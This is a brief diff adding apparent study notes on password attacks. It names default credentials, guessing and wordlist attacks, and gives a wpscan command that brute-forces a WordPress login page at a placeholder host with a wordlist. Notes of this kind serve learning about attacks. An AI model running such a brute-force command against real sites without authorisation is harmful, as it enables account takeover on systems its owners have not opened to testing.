@@ -1,0 +1,8 @@
+Password attack
+
+default credentials
+guessing the password
+wordlist attack
+
+wpscan --url http://somesite/wp-login.php -U testsite-1a -P word.txt
+
